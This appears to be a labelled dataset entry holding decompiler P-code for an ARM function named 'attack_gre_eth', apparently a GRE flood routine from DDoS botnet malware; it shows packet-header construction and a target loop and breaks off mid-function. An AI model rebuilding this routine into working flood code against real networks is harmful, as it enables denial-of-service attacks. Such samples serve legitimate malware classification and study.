Label: 1643767363
Function: attack_gre_eth
Architecture: arm
Source File: Unknown
Entry Point: 00015a0c

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x100003d8, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (const, 0x11, 1)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0x9c9, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0x9c9, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0x9c9, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0x9c9, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffa4, 4) , (const, 0x9, 4)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0x9cb, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0x9cb, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0x9cb, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x9cb, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x9cb, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000255, 4) , (register, 0x20, 4)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0x9d0, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0x9d0, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0x9d0, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0x9d0, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffa4, 4) , (const, 0xc, 4)
(unique, 0x10000255, 4) PTRSUB (unique, 0x10000434, 4) , (const, 0x0, 4)
(unique, 0x10000434, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x65, 1) INT_EQUAL (stack, 0xffffffffffffffda, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x15e78, 1) , (register, 0x65, 1)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x10000259, 4) PTRSUB (stack, 0xffffffffffffffb0, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000440, 4) , (const, 0x4, 4)
(unique, 0x10000440, 4) PTRSUB (unique, 0x10000259, 4) , (const, 0x0, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x28, 4)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0x9ec, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0x9ec, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0x9ec, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0x9ec, 4)
(unique, 0x10000261, 4) PTRSUB (stack, 0xffffffffffffffa4, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000444, 4) , (const, 0x4, 4)
(unique, 0x10000444, 4) PTRSUB (unique, 0x10000261, 4) , (const, 0x0, 4)
 ---  BRANCH (ram, 0x15e90, 1)
(register, 0x2c, 4) LOAD (const, 0x1a1, 4) , (unique, 0x1000026d, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffa4, 4) , (const, 0xc, 4)
(unique, 0x1000026d, 4) PTRSUB (unique, 0x10000438, 4) , (const, 0x0, 4)
(unique, 0x10000438, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x2c, 4) INT_SUB (const, 0x3ff, 4) , (register, 0x2c, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x2c, 4)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0xa77, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0xa77, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0xa77, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0xa77, 4)
(unique, 0x10000271, 4) PTRSUB (stack, 0xffffffffffffffa4, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x1000043c, 4) , (const, 0x4, 4)
(unique, 0x1000043c, 4) PTRSUB (unique, 0x10000271, 4) , (const, 0x0, 4)
(ram, 0x16338, 4) MULTIEQUAL (ram, 0x16338, 4) , (ram, 0x16338, 4)
(ram, 0x1633c, 4) MULTIEQUAL (ram, 0x1633c, 4) , (ram, 0x1633c, 4)
(ram, 0x16340, 4) MULTIEQUAL (ram, 0x16340, 4) , (ram, 0x16340, 4)
(ram, 0x16344, 4) MULTIEQUAL (ram, 0x16344, 4) , (ram, 0x16344, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe4, 2)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0x9f3, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0x9f3, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0x9f3, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x9f3, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x9f3, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000279, 4) , (register, 0x20, 2)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0x9fa, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0x9fa, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0x9fa, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0x9fa, 4)
(unique, 0x10000279, 4) PTRSUB (stack, 0xffffffffffffffa0, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe2, 2)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0xa00, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0xa00, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0xa00, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0xa00, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0xa00, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0xa00, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0xa00, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0xa00, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0xa00, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0xa00, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0xa00, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0xa00, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0xa00, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0xa07, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0xa07, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0xa07, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0xa07, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffa0, 4) , (const, 0x2, 4)
(unique, 0x3b00, 4) INT_AND (stack, 0xffffffffffffffdc, 4) , (const, 0xffff, 4)
(register, 0x2c, 4) INT_ADD (unique, 0x3b00, 4) , (const, 0x8, 4)
(unique, 0x3580, 4) INT_MULT (register, 0x2c, 4) , (const, 0x10000, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x20, 2)
(register, 0x20, 2) SUBPIECE (unique, 0x100003cc, 4) , (const, 0x0, 4)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0xa40, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0xa40, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0xa40, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0xa40, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0xa40, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0xa40, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0xa40, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0xa40, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0xa40, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0xa40, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0xa40, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0xa40, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0xa40, 4)
(unique, 0x100003cc, 4) INT_RIGHT (unique, 0x3580, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x16338, 4) INDIRECT (ram, 0x16338, 4) , (const, 0xa47, 4)
(ram, 0x1633c, 4) INDIRECT (ram, 0x1633c, 4) , (const, 0xa47, 4)
(ram, 0x16340, 4) INDIRECT (ram, 0x16340, 4) , (const, 0xa47, 4)
(ram, 0x16344, 4) INDIRECT (ram, 0x16344, 4) , (const, 0xa47, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffa0, 4) , (const, 0x4, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffff9c, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x16338, 4) MULTIEQUAL (ram, 0x16338, 4) , (ram, 0x16338, 4)
(ram, 0x1633c, 4) MULTIEQUAL (ram, 0x1633c, 4) , (ram, 0x1633c, 4)
(ram, 0x16340, 4) MULTIEQUAL (ram, 0x16340, 4) , (ram, 0x16340, 4)
(ram, 0x16344, 4) MULTIEQUAL (ram, 0x16344, 4) , (ram, 0x16344, 4)
(stack, 0xffffffffffffff90, 4) MULTIEQUAL (stack, 0xffffffffffffff90, 4) , (stack, 0xffffffffffffff90, 4)
(stack, 0xffffffffffffff94, 4) MULTIEQUAL (stack, 0xffffffffffffff94, 4) , (stack, 0xffffffffffffff94, 4)
(stack, 0xffffffffffffff98, 4) MULTIEQUAL (stack, 0xffffffffffffff98, 4) , (stack, 0xffffffffffffff98, 4)
(stack, 0xffffffffffffff9c, 4) MULTIEQUAL (stack, 0xffffffffffffff9c, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffffa0, 4) MULTIEQUAL (stack, 0xffffffffffffffa0, 4) , (stack, 0xffffffffffffffa0, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffff9c, 4) , (unique, 0x100003dc, 4)
 ---  CBRANCH (ram, 0x15bc8, 1) , (unique, 0x2480, 1)
(unique, 0x100003dc, 4) CAST (register, 0x28, 4)
(ram, 0x16338, 4) MULTIEQUAL (ram, 0x16338, 4) , (ram, 0x16338, 4)
(ram, 0x1633c, 4) MULTIEQUAL (ram, 0x1633c, 4) , (ram, 0x1633c, 4)
(ram, 0x16340, 4) MULTIEQUAL (ram, 0x16340, 4) , (ram, 0x16340, 4)
(ram, 0x16344, 4) MULTIEQUAL (ram, 0x16344, 4) , (ram, 0x16344, 4)
(stack, 0xffffffffffffff90, 4) MULTIEQUAL (stack, 0xffffffffffffff90, 4) , (stack, 0xffffffffffffff90, 4)
(stack, 0xffffffffffffff94, 4) MULTIEQUAL (stack, 0xffffffffffffff94, 4) , (stack, 0xffffffffffffff94, 4)
(stack, 0xffffffffffffff98, 4) MULTIEQUAL (stack, 0xffffffffffffff98, 4) , (stack, 0xffffffffffffff98, 4)
(stack, 0xffffffffffffffa0, 4) MULTIEQUAL (stack, 0xffffffffffffffa0, 4) , (stack, 0xffffffffffffffa0, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(stack, 0xffffffffffffff9c, 4) COPY (const, 0x0, 4)
 ---  BRANCH (ram, 0x16318, 1)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffff9c, 4) , (const, 0x4, 4)
(unique, 0x1000044c, 4) LOAD (const, 0x1a1, 4) , (register, 0x2c, 4)
(register, 0x2c, 4) CAST (unique, 0x1000044c, 4)
(unique, 0x10000450, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(register, 0x2c, 4) CAST (unique, 0x10000450, 4)
(unique, 0x1000028d, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(unique, 0x10000454, 4) PTRSUB (unique, 0x1000028d, 4) , (const, 0x4, 4)
(register, 0x2c, 4) CAST (unique, 0x10000454, 4)
(unique, 0x10000295, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(unique, 0x10000299, 4) PTRSUB (unique, 0x10000295, 4) , (const, 0xc, 4)
(unique, 0x1000045c, 4) INT_ADD (unique, 0x10000458, 4) , (const, 0x6, 4)
(unique, 0x10000458, 4) CAST (unique, 0x10000299, 4)
(register, 0x2c, 4) CAST (unique, 0x1000045c, 4)
(unique, 0x100002a1, 4) PTRADD (register, 0x2c, 4) , (const, 0x2, 4) , (const, 0x14, 4)
(unique, 0x100002a5, 4) PTRSUB (unique, 0x100002a1, 4) , (const, 0xc, 4)
(unique, 0x10000464, 4) INT_ADD (unique, 0x10000460, 4) , (const, 0x6, 4)
(unique, 0x10000460, 4) CAST (unique, 0x100002a5, 4)
(register, 0x2c, 4) CAST (unique, 0x10000464, 4)
(unique, 0x100002ad, 4) PTRADD (register, 0x2c, 4) , (const, 0x3, 4) , (const, 0x14, 4)
